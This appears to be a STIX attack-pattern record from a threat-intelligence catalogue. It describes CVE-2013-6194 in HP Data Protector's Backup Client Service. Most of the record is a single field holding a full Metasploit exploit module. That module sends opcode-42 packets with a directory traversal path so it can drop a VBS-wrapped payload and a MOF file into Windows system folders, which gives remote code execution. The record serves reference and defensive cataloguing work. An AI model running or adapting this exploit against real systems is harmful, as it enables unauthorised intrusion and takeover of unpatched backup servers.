{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74e37094-20e6-42af-af6b-caea505a3ab8",
    "created": "2024-08-14T16:46:05.451133Z",
    "modified": "2024-08-14T16:46:05.451136Z",
    "name": "HP Data Protector Backup Client Service Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in the Hewlett-Packard Data Protector product. The vulnerability exists in the Backup Client Service (OmniInet.exe) and is triggered when parsing packets with opcode 42. This module has been tested successfully on HP Data Protector 6.20 on Windows 2003 SP2 and Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_traversal.rb",
            "external_id": "hp_dataprotector_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6194"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector Backup Client Service Directory Traversal',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability in the Hewlett-Packard Data\n        Protector product. The vulnerability exists in the Backup Client Service (OmniInet.exe)\n        and is triggered when parsing packets with opcode 42. This module has been tested\n        successfully on HP Data Protector 6.20 on Windows 2003 SP2 and Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'Brian Gorenc', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-6194' ],\n          [ 'OSVDB', '101630' ],\n          [ 'BID', '64647' ],\n          [ 'ZDI', '14-003' ],\n          [ 'URL' , 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'       => 2048, # Payload embedded into an exe\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'WfsDelay' => 5\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          [ 'HP Data Protector 6.20 build 370 / Windows 2003 SP2', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-02'))\n\n    register_options([Opt::RPORT(5555)])\n  end\n\n  def check\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    print_status(\"HP Data Protector version #{fingerprint}\")\n\n    if fingerprint =~ /HP Data Protector A\\.06\\.(\\d+)/\n      minor = $1.to_i\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    if minor < 21\n      return Exploit::CheckCode::Vulnerable\n    elsif minor == 21\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Detected\n    end\n\n  end\n\n  def exploit\n    # Setup the necessary files to do the wbemexec trick\n    vbs_name = rand_text_alpha(rand(10)+5) + '.vbs'\n    exe      = generate_payload_exe\n    vbs      = Msf::Util::EXE.to_exe_vbs(exe)\n    mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n    mof      = generate_mof(mof_name, vbs_name)\n\n    # We can't upload binary contents, so embedding the exe into a VBS.\n    print_status(\"Sending malicious packet with opcode 42 to upload the vbs payload #{vbs_name}...\")\n    upload_file(\"windows\\\\system32\\\\#{vbs_name}\", vbs)\n    register_file_for_cleanup(vbs_name)\n\n    print_status(\"Sending malicious packet with opcode 42 to upload the mof file #{mof_name}\")\n    upload_file(\"WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{mof_name}\")\n  end\n\n  def build_pkt(fields)\n    data = \"\\xff\\xfe\" # BOM Unicode\n    fields.each do |v|\n      data << \"#{Rex::Text.to_unicode(v)}\\x00\\x00\"\n      data << Rex::Text.to_unicode(\" \") # Separator\n    end\n\n    data.chomp!(Rex::Text.to_unicode(\" \")) # Delete last separator\n    return [data.length].pack(\"N\") + data\n  end\n\n  def get_fingerprint\n    ommni = connect\n    ommni.put(rand_text_alpha_upper(64))\n    resp = ommni.get_once(-1)\n    disconnect\n\n    if resp.nil?\n      return nil\n    end\n\n    return Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last nl\n  end\n\n  def upload_file(file_name, contents)\n    connect\n    pkt = build_pkt([\n      \"2\", # Message Type\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      rand_text_alpha(8),\n      \"42\", # Opcode\n      rand_text_alpha(8), # command\n      rand_text_alpha(8), # rissServerName\n      rand_text_alpha(8), # rissServerPort\n      \"\\\\..\\\\..\\\\..\\\\..\\\\..\\\\#{file_name}\", # rissServerCertificate\n      contents # Certificate contents\n    ])\n    sock.put(pkt)\n    sock.get_once\n    # You cannot be confident about the response to guess if upload\n    # has been successful or not. While testing, different result codes,\n    # including also no response because of timeout due to a process\n    # process execution after file write on the target\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-02",
    "x_mitre_platforms": [
        "win'"
    ]
}